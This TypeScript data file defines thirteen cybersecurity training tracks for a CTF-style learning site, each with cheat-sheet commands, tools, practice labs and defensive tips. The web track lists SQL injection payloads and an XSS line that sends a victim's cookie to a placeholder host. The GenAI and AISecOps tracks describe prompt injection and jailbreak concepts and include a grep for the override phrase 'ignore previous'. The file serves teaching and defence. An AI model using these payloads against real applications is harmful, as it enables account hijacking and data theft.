export type SheetRow = { code: string; note: string };
export type Sheet = { title: string; rows: SheetRow[] };
export type Lab = { name: string; url: string; note: string; href?: string };
export type Track = {
  slug: string;
  num: number;
  title: string;
  tag: string;
  color: string;
  blurb: string;
  skills: string[];
  sheets: Sheet[];
  tools: string[];
  labs: Lab[];
  defend: string[];
};

export const tracks: Record<string, Track> = {
  osint: {
    slug: "osint", num: 1, title: "OSINT", tag: "open-source intel", color: "#53b9f0",
    blurb: "Open-Source Intelligence: build a picture of a target from public data alone — no packets touched. The CTF skill is knowing where public footprints hide and how to pivot between them.",
    skills: ["search operators", "username enumeration", "metadata analysis", "geolocation", "WHOIS / DNS", "certificate transparency", "reverse image search", "breach awareness"],
    sheets: [
      { title: "Google dorking", rows: [
        { code: "site:example.com filetype:pdf", note: "Scope to a domain / file type" },
        { code: 'intitle:"index of" inurl:backup', note: "Exposed directory listings" },
        { code: '"internal use only" -site:example.com', note: "Leaked docs off-domain" },
        { code: "intext:password filetype:env", note: "Config / secret exposure patterns" },
      ]},
      { title: "Domain & infra recon", rows: [
        { code: "whois example.com", note: "Registrar, dates, contacts" },
        { code: "dig example.com ANY +noall +answer", note: "DNS records (A, MX, TXT…)" },
        { code: "curl -s https://crt.sh/?q=%25.example.com", note: "Subdomains via cert transparency" },
        { code: "exiftool photo.jpg", note: "GPS, device, timestamps in metadata" },
      ]},
    ],
    tools: ["Google dorks", "Shodan", "Censys", "crt.sh", "theHarvester", "Sherlock", "Maltego", "exiftool", "Wayback Machine"],
    labs: [
      { name: "TryHackMe — OSINT path", url: "https://tryhackme.com", note: "Guided rooms from dorking to sock puppets." },
      { name: "OSINT Dojo", url: "https://www.osintdojo.com", note: "Methodology + practice exercises." },
      { name: "Have I Been Pwned", url: "https://haveibeenpwned.com", note: "Check exposure of accounts you own." },
    ],
    defend: ["Minimise public footprint; review what staff post", "Strip EXIF/metadata before publishing files", "Monitor for exposed credentials and leaked keys", "Lock down DNS zone transfers and verbose WHOIS"],
  },

  network: {
    slug: "network", num: 2, title: "Network Challenge", tag: "traffic & protocols", color: "#43d183",
    blurb: "Read the wire. Pull flags out of packet captures, follow a conversation across a stream, and understand protocols well enough to spot what does not belong.",
    skills: ["packet analysis", "TCP/IP & HTTP", "Wireshark filters", "stream reconstruction", "protocol anomalies", "service enumeration"],
    sheets: [
      { title: "Wireshark display filters", rows: [
        { code: 'http.request.method == "POST"', note: "Posted form / login data" },
        { code: 'tcp.port == 80 && frame contains "flag"', note: "Keyword hunt in payloads" },
        { code: 'dns.qry.name contains "exfil"', note: "Suspicious DNS lookups" },
        { code: "tcp.flags.syn==1 && tcp.flags.ack==0", note: "Scan / connection attempts" },
      ]},
      { title: "Capture & carve (CLI)", rows: [
        { code: 'tshark -r cap.pcap -Y "http" -T fields -e http.host', note: "Extract fields from a pcap" },
        { code: "tcpdump -r cap.pcap -nn -A port 80", note: "Read a capture, ASCII payloads" },
        { code: "strings -n 8 cap.pcap | grep -i flag", note: "Quick keyword sweep" },
      ]},
      { title: "Common ports — web, remote & mail", rows: [
        { code: "20 / 21", note: "FTP (file transfer, control) — cleartext; try anonymous login" },
        { code: "22", note: "SSH / SFTP / SCP — encrypted shell; brute-force or keys" },
        { code: "23", note: "Telnet — cleartext remote shell; creds sniffable" },
        { code: "25 · 587 · 465", note: "SMTP · submission · SMTPS — send mail" },
        { code: "110 · 995", note: "POP3 · POP3S — retrieve mail" },
        { code: "143 · 993", note: "IMAP · IMAPS — retrieve mail" },
        { code: "53", note: "DNS — name lookups; watch for tunnelling / exfil" },
        { code: "80", note: "HTTP — web, unencrypted" },
        { code: "443", note: "HTTPS — web over TLS" },
        { code: "8080 · 8443", note: "HTTP-alt · HTTPS-alt — proxies, app servers, admin panels" },
        { code: "3389", note: "RDP — Windows remote desktop" },
        { code: "5900", note: "VNC — remote desktop" },
      ]},
      { title: "Common ports — Windows, directory & files", rows: [
        { code: "88", note: "Kerberos — Active Directory authentication" },
        { code: "135", note: "MSRPC — endpoint mapper" },
        { code: "137-139", note: "NetBIOS — legacy name / session service" },
        { code: "445", note: "SMB — Windows file sharing (enumerate shares)" },
        { code: "389 · 636", note: "LDAP · LDAPS — directory (3268/3269 = Global Catalog)" },
        { code: "161 / 162", note: "SNMP — device management; guess community strings" },
        { code: "69", note: "TFTP — trivial file transfer (no auth)" },
        { code: "111 · 2049", note: "RPCbind · NFS — network file shares" },
        { code: "873", note: "rsync — file sync (often exposed)" },
        { code: "5985 / 5986", note: "WinRM — Windows remote management (HTTP/HTTPS)" },
      ]},
      { title: "Common ports — databases, caches & platforms", rows: [
        { code: "3306", note: "MySQL / MariaDB" },
        { code: "5432", note: "PostgreSQL" },
        { code: "1433 / 1434", note: "Microsoft SQL Server" },
        { code: "1521", note: "Oracle DB" },
        { code: "27017", note: "MongoDB (often no auth)" },
        { code: "6379", note: "Redis (often no auth)" },
        { code: "11211", note: "Memcached" },
        { code: "9200 · 5601", note: "Elasticsearch · Kibana" },
        { code: "2375 / 2376", note: "Docker API — 2375 is unauthenticated = host takeover" },
        { code: "6443 · 10250", note: "Kubernetes API server · kubelet" },
      ]},
    ],
    tools: ["Wireshark", "tshark", "tcpdump", "Nmap", "Zeek", "NetworkMiner", "Scapy"],
    labs: [
      { name: "malware-traffic-analysis.net", url: "https://www.malware-traffic-analysis.net", note: "Real pcap analysis exercises with answers." },
      { name: "Wireshark sample captures", url: "https://wiki.wireshark.org/SampleCaptures", note: "Protocol examples to practice filtering." },
      { name: "TryHackMe — network rooms", url: "https://tryhackme.com", note: "Guided packet + enumeration labs." },
    ],
    defend: ["Only scan hosts you own or are authorized to test", "Segment networks; filter egress traffic", "Deploy IDS/IPS and baseline normal traffic", "Prefer encrypted protocols (TLS, SSH, DoH)"],
  },

  splunk: {
    slug: "splunk", num: 3, title: "Splunk", tag: "SIEM & log hunting", color: "#f6b84b",
    blurb: "When the answer is buried in millions of log lines, SPL is the shovel. Learn to filter, aggregate and pivot to find the one event that matters.",
    skills: ["SPL pipeline", "stats & aggregation", "field extraction (rex)", "timecharts", "correlation", "transactions"],
    sheets: [
      { title: "SPL essentials", rows: [
        { code: "index=main sourcetype=access_combined status>=500", note: "Scope + filter" },
        { code: "... | stats count by src_ip | sort -count", note: "Count & rank by field" },
        { code: "... | timechart span=1h count by status", note: "Trend over time" },
        { code: '... | rex field=_raw "user=(?<user>\\w+)"', note: "Extract a field at search time" },
      ]},
      { title: "Hunting patterns", rows: [
        { code: "... | top limit=10 uri_path", note: "Most-hit paths" },
        { code: "... | transaction src_ip maxpause=5m", note: "Group events into sessions" },
        { code: "... | eval ratio=bytes_out/bytes_in | where ratio>50", note: "Possible exfil heuristic" },
      ]},
    ],
    tools: ["Splunk", "SPL", "Boss of the SOC (BOTS) datasets", "Splunk Security Essentials"],
    labs: [
      { name: "Splunk Boss of the SOC (BOTS)", url: "https://bots.splunk.com", note: "Public datasets — the classic blue-team CTF." },
      { name: "Splunk free training", url: "https://www.splunk.com/en_us/training/free-courses/overview.html", note: "Search fundamentals, free." },
      { name: "TryHackMe — SIEM rooms", url: "https://tryhackme.com", note: "SPL and detection practice." },
    ],
    defend: ["Centralise logs; normalise sourcetypes", "Build detections & alerts, version them as code", "Dashboard the signals a SOC watches daily", "Tune to cut noise so real alerts surface"],
  },

  stego: {
    slug: "stego", num: 4, title: "Steganography", tag: "hidden in plain sight", color: "#b07cff",
    blurb: "Data hidden inside other data — a message in an image’s least-significant bits, a file appended past the end marker, a signal painted into an audio spectrogram.",
    skills: ["LSB analysis", "metadata inspection", "file carving", "spectrograms", "magic-byte / polyglot detection"],
    sheets: [
      { title: "Identify what you have", rows: [
        { code: "file suspicious.png", note: "True type vs. extension" },
        { code: "binwalk suspicious.png", note: "Find embedded/appended files" },
        { code: "exiftool -a -u suspicious.jpg", note: "All metadata, including hidden tags" },
        { code: "xxd suspicious.png | head", note: "Inspect magic bytes & structure" },
      ]},
      { title: "Extract", rows: [
        { code: "binwalk -e suspicious.png", note: "Auto-carve embedded files" },
        { code: "zsteg -a image.png", note: "PNG/BMP LSB across channels" },
        { code: "steghide extract -sf image.jpg", note: "JPEG payloads (passphrase)" },
        { code: "stegseek image.jpg wordlist.txt", note: "Crack a steghide passphrase" },
      ]},
    ],
    tools: ["binwalk", "zsteg", "steghide", "stegseek", "stegsolve", "exiftool", "foremost", "Audacity", "Aperi’Solve"],
    labs: [
      { name: "Lab tool: LSB playground", url: "/tools", href: "/tools", note: "Hide & reveal a message in image pixels, in-browser." },
      { name: "picoCTF — Forensics", url: "https://picoctf.org", note: "Beginner-friendly stego challenges." },
      { name: "Aperi’Solve", url: "https://www.aperisolve.com", note: "Layered stego analysis in one pass." },
    ],
    defend: ["Strip metadata and re-encode uploaded media", "Flag anomalous file sizes / entropy", "Content inspection & DLP on egress"],
  },

  crypto: {
    slug: "crypto", num: 5, title: "Cryptography", tag: "ciphers & encodings", color: "#ff8f5e",
    blurb: "From ROT13 to RSA. First tell encoding from encryption, identify the scheme, then apply the right attack — frequency analysis, a known weakness, or a dictionary.",
    skills: ["encoding vs. encryption", "classical ciphers", "frequency analysis", "hashing", "symmetric/asymmetric", "identifying schemes"],
    sheets: [
      { title: "Encodings (reversible, not secret)", rows: [
        { code: "Base64 / Base32 / Hex / URL", note: "Try the lab decoder in Tools" },
        { code: "ASCII <-> binary <-> decimal", note: "Padding of 8 bits = likely binary" },
        { code: "Morse, Atbash, ROT13/ROT47", note: "Fast to rule in or out" },
      ]},
      { title: "Classical & modern", rows: [
        { code: "Caesar / Vigenere / substitution", note: "Frequency analysis; try the playground" },
        { code: "XOR with repeating key", note: "Crib-drag; key often leaks" },
        { code: "hashcat -m 0 hashes.txt wordlist", note: "Crack hashes you are authorized to" },
        { code: "RSA: factordb / small-e / common-n", note: "CTF RSA usually has a flaw" },
      ]},
    ],
    tools: ["CyberChef", "dcode.fr", "hashcat", "John the Ripper", "RsaCtfTool", "factordb", "pycryptodome", "SageMath"],
    labs: [
      { name: "Lab tools: cipher + hashing", url: "/tools", href: "/tools", note: "Encoders, Caesar/Vigenere/XOR, SHA hashing, hash-ID." },
      { name: "CryptoHack", url: "https://cryptohack.org", note: "Best-in-class modern crypto puzzles." },
      { name: "Cryptopals", url: "https://cryptopals.com", note: "Attacks you implement yourself." },
    ],
    defend: ["Never roll your own crypto — use vetted libraries", "Hash passwords with argon2/bcrypt + salt", "Use authenticated encryption (AES-GCM)", "Rotate keys; manage them in a KMS/secret store"],
  },

  webmobile: {
    slug: "webmobile", num: 6, title: "Web & Mobile", tag: "app attack surface", color: "#ff5e8a",
    blurb: "The biggest CTF surface. Map the app, abuse trust boundaries, and chain small flaws into impact. Pairs directly with the OWASP Top 10 track. Lab targets only.",
    skills: ["HTTP & proxies", "injection", "auth/session flaws", "IDOR", "SSRF & traversal", "APK/IPA analysis"],
    sheets: [
      { title: "Read the response (where flags hide)", rows: [
        { code: "curl -i http://app/", note: "Show response headers + body — flags hide in X- headers" },
        { code: "curl http://app/api/... | grep -iE 'ctf|flag'", note: "Grep raw JSON/HTML the UI never shows" },
        { code: "robots.txt · sitemap.xml · /.git/ · *.js.map", note: "Low-hanging exposure & source leaks" },
        { code: "ffuf -u http://app/FUZZ -w wordlist.txt", note: "Discover hidden paths & parameters" },
      ]},
      { title: "SQL injection -> read the flag", rows: [
        { code: "?id=1'", note: "Detect: a SQL error means it's injectable" },
        { code: "?id=1' OR '1'='1-- -", note: "Boolean bypass (login/filter)" },
        { code: "UNION SELECT table_name,2 FROM information_schema.tables", note: "Enumerate table names" },
        { code: "?id=-1 UNION SELECT flag,2 FROM flags-- -", note: "Extract: flag lands where the name renders" },
        { code: "sqlmap -u 'http://app/item?id=1' --dump", note: "Automate detection + dump tables" },
      ]},
      { title: "XSS -> steal the flag", rows: [
        { code: "?q=<b>x</b>", note: "Confirm: comes back bold = unescaped = XSS" },
        { code: "<img src=x onerror=alert(1)>", note: "Prove script execution" },
        { code: "<script>new Image().src='//me/'+document.cookie</script>", note: "Exfiltrate the admin/victim cookie" },
      ]},
      { title: "Mobile (APK) analysis", rows: [
        { code: "apktool d app.apk   ·   jadx -d out/ app.apk", note: "Decompile resources, manifest & Java" },
        { code: "aapt dump permissions app.apk", note: "List permissions without decompiling" },
        { code: "cat app/AndroidManifest.xml", note: "uses-permission, usesCleartextTraffic, exported, debuggable" },
        { code: 'grep -ri "api_key\\|secret\\|HHB" app/res/', note: "Hardcoded secrets in strings.xml / resources" },
        { code: "MobSF (static+dynamic)", note: "Automated mobile (MAST) scan" },
      ]},
    ],
    tools: ["Burp Suite", "OWASP ZAP", "ffuf", "gobuster", "sqlmap", "nikto", "jadx", "apktool", "Frida", "MobSF"],
    labs: [
      { name: "PortSwigger Web Security Academy", url: "https://portswigger.net/web-security", note: "Free, world-class, with live labs. Start here." },
      { name: "OWASP Juice Shop", url: "https://owasp.org/www-project-juice-shop/", note: "Deliberately vulnerable modern web app." },
      { name: "DVWA / WebGoat", url: "https://github.com/digininja/DVWA", note: "Classic self-hosted practice targets." },
    ],
    defend: ["See the OWASP Top 10 track for per-risk defenses", "Parameterize queries; encode all output", "Enforce auth server-side on every object (no IDOR)", "Pin certs & keep secrets out of mobile builds"],
  },

  genai: {
    slug: "genai", num: 7, title: "GenAI / Prompt Eng.", tag: "LLM security", color: "#5ee0c8",
    blurb: "This year’s focus. LLM-backed apps add a brand-new attack surface: untrusted text that the model may treat as instructions. Learn to break and then harden it. Maps to the OWASP LLM Top 10.",
    skills: ["prompt injection (direct/indirect)", "jailbreak patterns", "system-prompt leakage", "insecure output handling", "excessive agency", "guardrail design"],
    sheets: [
      { title: "How LLM apps get attacked (concepts)", rows: [
        { code: "Direct injection", note: "User input overrides the system prompt" },
        { code: "Indirect injection", note: "Instructions hidden in retrieved web/doc/email content" },
        { code: "Insecure output handling", note: "LLM output used as HTML/SQL/shell downstream" },
        { code: "Excessive agency", note: "Over-broad tool/plugin permissions get abused" },
      ]},
      { title: "Defensive playbook", rows: [
        { code: "Treat all model output as untrusted", note: "Encode/validate before use" },
        { code: "Least privilege for tools & data", note: "Scope every action the agent can take" },
        { code: "Human-in-the-loop for high impact", note: "Confirm irreversible actions" },
        { code: "Separate data from instructions", note: "Mark & isolate retrieved content" },
      ]},
    ],
    tools: ["OWASP LLM Top 10", "garak", "PyRIT", "promptfoo", "Rebuff", "Lakera Guard"],
    labs: [
      { name: "OWASP LLM Top 10 track", url: "/llm", href: "/llm", note: "Full risk list with tests & defenses." },
      { name: "Lakera — Gandalf", url: "https://gandalf.lakera.ai", note: "Prompt-injection game, beginner to hard." },
      { name: "HackAPrompt", url: "https://www.hackaprompt.com", note: "Structured prompt-hacking challenges." },
    ],
    defend: ["Validate & encode model output before any downstream use", "Constrain tools to least privilege; log tool calls", "Guard against indirect injection in RAG sources", "Red-team with garak/PyRIT before shipping"],
  },

  forensics: {
    slug: "forensics", num: 8, title: "Forensics", tag: "DFIR & artifacts", color: "#8fb4ff",
    blurb: "Reconstruct what happened from the evidence left behind — disk images, memory dumps, logs and file artifacts. Patience and a timeline win these.",
    skills: ["disk & memory forensics", "file carving", "timeline analysis", "Windows artifacts", "log analysis", "integrity hashing"],
    sheets: [
      { title: "Files & disk", rows: [
        { code: "file / binwalk / foremost", note: "Identify & carve" },
        { code: "photorec image.dd", note: "Recover deleted files" },
        { code: "fls -r -m / image.dd", note: "Walk the filesystem (Sleuth Kit)" },
        { code: "sha256sum evidence.dd", note: "Preserve integrity / chain of custody" },
      ]},
      { title: "Memory (Volatility 3)", rows: [
        { code: "vol -f mem.raw windows.pslist", note: "Running processes" },
        { code: "vol -f mem.raw windows.cmdline", note: "Process command lines" },
        { code: "vol -f mem.raw windows.netscan", note: "Network connections" },
        { code: "vol -f mem.raw windows.malfind", note: "Injected / hidden code" },
      ]},
    ],
    tools: ["Autopsy", "Sleuth Kit", "Volatility 3", "binwalk", "foremost", "photorec", "exiftool", "plaso", "Eric Zimmerman tools"],
    labs: [
      { name: "HackTheBox — Sherlocks", url: "https://www.hackthebox.com", note: "Guided DFIR investigations." },
      { name: "Magnet Weekly CTF", url: "https://www.magnetforensics.com", note: "Real-world forensic artifact puzzles." },
      { name: "TryHackMe — DFIR path", url: "https://tryhackme.com", note: "Memory, disk and log rooms." },
    ],
    defend: ["Centralise & retain logs; protect them from tampering", "Deploy EDR; keep forensic readiness runbooks", "Maintain tested backups and an IR plan", "Document chain of custody for every artifact"],
  },

  os: {
    slug: "os", num: 9, title: "OS", tag: "systems & shell", color: "#ffb85e",
    blurb: "Command-line fluency and OS internals. On authorized boxes (HTB/THM/VulnHub), enumerate thoroughly and understand privilege boundaries — the same knowledge hardens them.",
    skills: ["Linux/Windows internals", "shell & scripting", "enumeration", "privilege boundaries", "permissions model", "services"],
    sheets: [
      { title: "Linux enumeration (authorized boxes)", rows: [
        { code: "id; uname -a; sudo -l", note: "Who am I, kernel, sudo rights" },
        { code: "find / -perm -4000 2>/dev/null", note: "SUID binaries (check GTFOBins)" },
        { code: "crontab -l; ls -la /etc/cron*", note: "Scheduled jobs" },
        { code: "ss -tulpn", note: "Listening services" },
      ]},
      { title: "Windows enumeration", rows: [
        { code: "whoami /priv", note: "Token privileges" },
        { code: "systeminfo", note: "Patch level & build" },
        { code: "wmic service get name,pathname", note: "Unquoted service paths" },
        { code: "cmdkey /list", note: "Saved credentials" },
      ]},
    ],
    tools: ["LinPEAS / WinPEAS", "GTFOBins", "LOLBAS", "pspy", "PowerShell", "bash", "Metasploit (lab)"],
    labs: [
      { name: "OverTheWire — Bandit", url: "https://overthewire.org/wargames/bandit/", note: "The canonical Linux CLI on-ramp. Start here." },
      { name: "HackTheBox / TryHackMe", url: "https://www.hackthebox.com", note: "Full authorized boxes end-to-end." },
      { name: "VulnHub", url: "https://www.vulnhub.com", note: "Download & run vulnerable VMs locally." },
    ],
    defend: ["Least privilege; remove unneeded SUID & admin rights", "Patch promptly; track CIS benchmarks", "Harden services; fix unquoted paths & weak ACLs", "Monitor process creation and auth events"],
  },

  // ── Intermediate and advanced tracks (beyond the nine CTF categories) ──────
  devops: {
    slug: "devops", num: 10, title: "DevOps & Cloud", tag: "pipelines & platforms", color: "#5aa9ff",
    blurb: "How modern software is built, shipped and run: version control, CI/CD pipelines, containers, Kubernetes and infrastructure as code. Defenders have to read all of it — most production incidents (and their fixes) start here.",
    skills: ["Git history", "CI/CD pipelines", "Docker images", "Kubernetes basics", "Terraform (infrastructure as code)", "cloud shared responsibility", "reading deploy logs"],
    sheets: [
      { title: "Git & pipelines", rows: [
        { code: "git log --oneline -n 5", note: "The last five commits, one per line" },
        { code: "git show <commit> --stat", note: "Which files a commit changed" },
        { code: "git diff main..feature", note: "What a branch changes compared with main" },
        { code: "cat .github/workflows/ci.yml", note: "Read a pipeline: jobs, their order (needs:) and steps" },
      ]},
      { title: "Containers & Kubernetes", rows: [
        { code: "docker build -t shop:1.4.2 .", note: "Build an image with a pinned version tag" },
        { code: "docker image ls", note: "Images on this machine, with tags and sizes" },
        { code: "kubectl get pods -n shop", note: "Pods and their status (Running, CrashLoopBackOff…)" },
        { code: "kubectl describe pod <name>", note: "Events: why a pod won't start" },
        { code: "kubectl logs <pod>", note: "The app's own output — usually where the real error is" },
      ]},
      { title: "Infrastructure as code", rows: [
        { code: "terraform plan", note: "Preview every change before anything happens" },
        { code: "terraform apply", note: "Make the changes the plan showed" },
        { code: "terraform state list", note: "Resources Terraform is managing" },
      ]},
    ],
    tools: ["Git", "GitHub Actions", "GitLab CI", "Jenkins", "Docker", "Kubernetes (kubectl)", "Helm", "Terraform", "AWS / Azure / Google Cloud"],
    labs: [
      { name: "Learn Git Branching", url: "https://learngitbranching.js.org", note: "Visual, interactive Git practice in the browser." },
      { name: "Killercoda", url: "https://killercoda.com", note: "Free browser-based Linux and Kubernetes playgrounds." },
      { name: "Kubernetes tutorials", url: "https://kubernetes.io/docs/tutorials/", note: "Official step-by-step tutorials." },
      { name: "HashiCorp Terraform tutorials", url: "https://developer.hashicorp.com/terraform/tutorials", note: "Official getting-started paths." },
    ],
    defend: ["Pin image tags and versions — never deploy :latest", "Require review and passing tests before anything merges", "Keep secrets in a secret manager, not in repos or pipeline files", "Read the terraform plan before every apply", "Give pipelines and pods only the permissions they need"],
  },

  devsecops: {
    slug: "devsecops", num: 11, title: "DevSecOps", tag: "security in the pipeline", color: "#ff7ac6",
    blurb: "Shift security left: catch leaked secrets, vulnerable dependencies, risky container images and insecure infrastructure code automatically, before they ship. You'll read real scanner output and decide what to fix first.",
    skills: ["secret scanning", "dependency scanning (SCA)", "SBOMs", "static analysis (SAST)", "container hardening", "IaC scanning", "supply-chain integrity", "triaging findings"],
    sheets: [
      { title: "Scanners in the pipeline", rows: [
        { code: "gitleaks detect --source .", note: "Secrets committed anywhere in the repo's history" },
        { code: "trivy fs .", note: "Known-vulnerable dependencies in a project" },
        { code: "trivy image shop:1.4.2", note: "Vulnerabilities inside a container image" },
        { code: "semgrep --config auto .", note: "Static analysis for risky code patterns" },
        { code: "checkov -d infra/", note: "Misconfigurations in Terraform, Kubernetes and Dockerfiles" },
      ]},
      { title: "Supply chain", rows: [
        { code: "syft shop:1.4.2 -o spdx-json > sbom.json", note: "Generate an SBOM — the image's ingredient list" },
        { code: "sha256sum -c CHECKSUMS.txt", note: "Verify downloads against published fingerprints" },
        { code: "cosign verify <image>", note: "Check an image's signature (with the signer's key or identity)" },
      ]},
      { title: "Dockerfile hardening", rows: [
        { code: "FROM node:20-alpine", note: "Small base image with a pinned version" },
        { code: "USER app", note: "Run as a normal user, not root" },
        { code: "COPY --chown=app:app . .", note: "Files owned by the app user, not root" },
      ]},
    ],
    tools: ["gitleaks", "TruffleHog", "Trivy", "Grype", "Syft", "Semgrep", "CodeQL", "Checkov", "Dependabot", "Sigstore / cosign", "OWASP Dependency-Check"],
    labs: [
      { name: "OWASP WrongSecrets", url: "https://owasp.org/www-project-wrongsecrets/", note: "Practice finding secrets stored the wrong way." },
      { name: "OWASP DevSecOps Guideline", url: "https://owasp.org/www-project-devsecops-guideline/", note: "Which checks belong in which pipeline stage." },
      { name: "Kubernetes Goat", url: "https://madhuakula.com/kubernetes-goat/", note: "An intentionally vulnerable cluster to run locally." },
      { name: "GitHub Skills", url: "https://skills.github.com", note: "Hands-on courses, including secure-code scanning." },
    ],
    defend: ["Block merges when a secret or critical vulnerability is found", "Rotate any secret that ever reached a repo — deleting the line isn't enough", "Keep an SBOM for every release so you can answer \"are we affected?\" fast", "Run containers as a non-root user from minimal, pinned base images", "Sign images and verify the signature before deploying"],
  },

  secops: {
    slug: "secops", num: 12, title: "Advanced SecOps", tag: "hunt, detect, respond", color: "#e0c44f",
    blurb: "Go beyond single alerts: hunt for attackers who didn't trip one, write detections that catch behaviour, and run an incident from first signal to containment. Builds on Splunk, Forensics and OS.",
    skills: ["threat hunting", "detection engineering", "Sigma rules", "MITRE ATT&CK mapping", "process trees", "beaconing analysis", "DNS tunnelling signs", "incident response"],
    sheets: [
      { title: "Hunting searches (SPL)", rows: [
        { code: "index=sysmon EventCode=1 | stats count by ParentImage, Image | sort count", note: "Rare parent → child process pairs rise to the top" },
        { code: "index=proxy | stats count by src, dest | where count > 50", note: "One host talking to one destination very often (beaconing)" },
        { code: "index=dns | eval len=len(query) | where len > 60", note: "Unusually long DNS names (possible tunnelling)" },
        { code: "index=auth action=failure | stats dc(user) as users by src | where users > 10", note: "One source trying many usernames (password spraying)" },
      ]},
      { title: "Detection as code", rows: [
        { code: "sigma convert -t splunk -p splunk_windows rule.yml", note: "Turn a Sigma rule into a Splunk search (sigma-cli)" },
        { code: "tags: [attack.t1059.001]", note: "Map a rule to a MITRE ATT&CK technique" },
        { code: "condition: selection and not filter", note: "Match the bad pattern, minus known-good exceptions" },
      ]},
      { title: "First response on a host", rows: [
        { code: "ps -ef --forest", note: "Process tree: who started what" },
        { code: "ss -tnp", note: "Live connections and the programs that own them" },
        { code: "last -F", note: "Recent logins with full times" },
        { code: "sha256sum suspicious.bin", note: "Hash before you share or submit a sample" },
      ]},
    ],
    tools: ["Splunk / Elastic", "Sigma", "MITRE ATT&CK Navigator", "Sysmon", "Zeek", "Velociraptor", "YARA", "TheHive"],
    labs: [
      { name: "Boss of the SOC v3 dataset", url: "https://github.com/splunk/botsv3", note: "A full Splunk dataset to hunt through." },
      { name: "Blue Team Labs Online", url: "https://blueteamlabs.online", note: "Investigation challenges for defenders." },
      { name: "CyberDefenders", url: "https://cyberdefenders.org", note: "Blue-team labs: DFIR, threat hunting, network." },
      { name: "MITRE ATT&CK", url: "https://attack.mitre.org", note: "The shared map of attacker techniques." },
    ],
    defend: ["Collect process creation, network connections and logins centrally", "Turn every incident into a detection so it can't repeat silently", "Practise containment steps before you need them", "Map detections to ATT&CK to find gaps in coverage", "Preserve evidence: hash it, copy it, then analyse the copy"],
  },

  aisecops: {
    slug: "aisecops", num: 13, title: "AISecOps", tag: "securing AI in production", color: "#9be35e",
    blurb: "Run AI features safely: threat-model an LLM app, put guardrails and evaluations in the pipeline, keep models and data trustworthy, and monitor prompts, tool calls and spending like any other production system.",
    skills: ["AI threat modelling", "prompt-injection defence", "guardrails & evals", "RAG data hygiene", "agent / tool permissions", "model supply chain", "AI logging & monitoring", "AI governance (NIST AI RMF, ISO 42001)"],
    sheets: [
      { title: "Investigate an AI app", rows: [
        { code: "grep -c '\"action\":\"block\"' prompts.jsonl", note: "How many prompts the guardrail blocked" },
        { code: "grep -ril 'ignore previous' rag/", note: "Knowledge-base files carrying injected instructions" },
        { code: "grep '\"tool\":\"send_email\"' tools.jsonl", note: "Every email an agent tried to send" },
        { code: "sha256sum -c models.sha256", note: "Verify model files before loading them" },
      ]},
      { title: "Guardrail settings to check", rows: [
        { code: "require_approval: true", note: "A person approves risky tool actions" },
        { code: "allowed_domains: [example.com]", note: "Allow-list where tools may send data" },
        { code: "max_tool_calls_per_request: 5", note: "Cap what an agent can do in one go" },
        { code: "strip_html_comments: true", note: "Remove hidden text from retrieved documents" },
      ]},
    ],
    tools: ["OWASP Top 10 for LLM Apps", "MITRE ATLAS", "NIST AI RMF", "garak (LLM scanner)", "promptfoo (evals)", "NeMo Guardrails", "Llama Guard", "model cards / ML-BOM", "OpenTelemetry traces"],
    labs: [
      { name: "OWASP GenAI Security Project", url: "https://genai.owasp.org", note: "LLM Top 10 and guidance for securing AI apps." },
      { name: "MITRE ATLAS", url: "https://atlas.mitre.org", note: "ATT&CK-style map of attacks on AI systems." },
      { name: "Gandalf (Lakera)", url: "https://gandalf.lakera.ai", note: "A game for practising prompt-injection defence." },
      { name: "NIST AI Risk Management Framework", url: "https://www.nist.gov/itl/ai-risk-management-framework", note: "How organisations govern AI risk." },
    ],
    defend: ["Treat model output and retrieved text as untrusted input", "Give agents allow-listed tools with least privilege; require approval for risky actions", "Verify model and dataset hashes or signatures before use", "Run injection and data-leak evaluations in CI and block failing releases", "Log prompts, tool calls and decisions (with personal data redacted) and alert on anomalies"],
  },
};

export const trackOrder = ["osint", "network", "splunk", "stego", "crypto", "webmobile", "genai", "forensics", "os", "devops", "devsecops", "secops", "aisecops"];
